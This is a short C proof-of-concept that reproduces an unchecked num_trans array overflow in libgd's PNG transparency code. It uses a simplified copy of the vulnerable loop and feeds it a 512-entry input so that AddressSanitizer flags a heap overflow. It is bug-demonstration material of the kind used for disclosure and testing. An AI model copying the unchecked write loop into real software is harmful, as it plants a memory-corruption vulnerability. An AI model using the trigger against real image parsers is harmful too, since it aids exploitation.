// PoC for gdImageCreateFromPngCtx array overflow
// Vulnerability: num_trans not checked against gdMaxColors

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define gdMaxColors 256
#define gdAlphaMax 127

// Simplified gdImage structure
typedef struct {
    int alpha[gdMaxColors];  // Fixed size array
    int transparent;
} gdImage;

// Vulnerable function (simplified from gd_png.c:235)
void process_transparency_vulnerable(gdImage* im, unsigned char* trans, int num_trans) {
    int firstZero = 1;

    printf("[*] Processing %d transparency entries\n", num_trans);
    printf("[*] alpha array size: %d\n", gdMaxColors);

    // Vulnerable loop - no check against gdMaxColors!
    for (int i = 0; i < num_trans; ++i) {
        im->alpha[i] = gdAlphaMax - (trans[i] >> 1);

        if (i < 10 || i >= num_trans - 5) {
            printf("[+] alpha[%d] = %d\n", i, im->alpha[i]);
        } else if (i == 10) {
            printf("    ... (%d entries) ...\n", num_trans - 15);
        }

        if ((trans[i] == 0) && (firstZero)) {
            im->transparent = i;
            firstZero = 0;
        }
    }
}

int main() {
    printf("=== PoC: PNG num_trans Array Overflow ===\n\n");

    gdImage* im = (gdImage*)calloc(1, sizeof(gdImage));
    printf("[*] Allocated gdImage at: %p\n", im);
    printf("[*] alpha array at: %p\n", im->alpha);
    printf("[*] alpha array ends at: %p\n\n", (void*)((char*)im->alpha + sizeof(im->alpha)));

    // Test 1: Normal case
    printf("[*] Test 1: Normal num_trans=10\n");
    unsigned char trans_normal[10] = {255, 200, 150, 100, 50, 0, 50, 100, 150, 200};
    process_transparency_vulnerable(im, trans_normal, 10);

    // Test 2: Boundary case
    printf("\n[*] Test 2: Boundary num_trans=256 (exactly gdMaxColors)\n");
    unsigned char* trans_boundary = (unsigned char*)malloc(256);
    memset(trans_boundary, 128, 256);
    process_transparency_vulnerable(im, trans_boundary, 256);

    // Test 3: Overflow case - THIS SHOULD TRIGGER ASAN
    printf("\n[*] Test 3: OVERFLOW num_trans=512 (2x gdMaxColors)\n");
    unsigned char* trans_overflow = (unsigned char*)malloc(512);
    memset(trans_overflow, 64, 512);
    process_transparency_vulnerable(im, trans_overflow, 512);

    printf("\n[!] If ASAN is enabled, you should see heap-buffer-overflow in Test 3\n");

    free(trans_boundary);
    free(trans_overflow);
    free(im);
    return 0;
}
